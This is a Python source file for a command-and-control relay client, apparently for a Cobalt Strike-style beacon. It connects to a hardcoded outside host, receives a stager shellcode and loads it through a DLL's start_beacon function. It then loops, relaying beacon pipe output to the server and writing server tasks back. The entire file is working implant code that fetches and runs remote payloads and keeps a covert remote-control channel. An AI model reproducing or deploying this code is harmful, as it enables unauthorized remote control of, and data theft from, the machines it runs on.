from ctypes import *
from ctypes.wintypes import *
from time import sleep
import sys
import os
import struct

# Encoder imports:
import base64

# Transport imports:
import socket


# START GHETTO ASS CONFIG, should be read in when compiled...

HOST = "fuckd.at"
PORT = "8081"

# Timeout in seconds to wait for a new task
SOCK_TIME_OUT = 5.0


# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
	return base64.b64encode(data)

def decode(data):
	return base64.b64decode(data)
# </encoder functions>

# <transport functions>
def prepTransport():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "Connecting to %s:%s" %(str(HOST),str(PORT))
	connect = sock.connect((str(HOST),int(PORT)))
	print "Connected!"
	return sock

def sendData(sock, data):
	encoded_data = encode(data)
	slen = struct.pack('<I', len(encoded_data))
	sock.sendall(slen + encoded_data)

	return 0

def recvData(sock):
	data = "" # TODO
	# sock.settimeout(SOCK_TIME_OUT)
	newTask = sock.recv(8126)
	print "newTask = " + str(newTask) #DEBUG

	decoded_task = decode(newTask)
	return decoded_task
# </transport functions>


maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go(sock):
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p=""
	# Wait for shellcode
	while(len(p) <= 0):
		print "Next chunk.."
		sleep(0.3)
		p = recvData(sock)
	print "Got a stager! loading..."
	sleep(2)
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)
	print "loaded, got handle: %s" % (handle_beacon)
	return handle_beacon

def interact(sock, handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		if len(chunk) > 1:
			print "relaying chunk to server"
			# LOGIC TO SEND A CHUNK OF DATA THROUGH THE SOCKET GOES HERE
			data = encode(chunk)
			sendData(sock, data) # DEBUG/TODO

		# LOGIC TO CHECK FOR A NEW TASK
		newTask = recvData(sock)
		if len(newTask) > 0:
			print "Got new task: %s" % (newTask)

		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)


# Prepare the transport module
sock = prepTransport()

# Get and inject the stager
handle_beacon = go(sock)

# Run the main loop
interact(sock, handle_beacon)
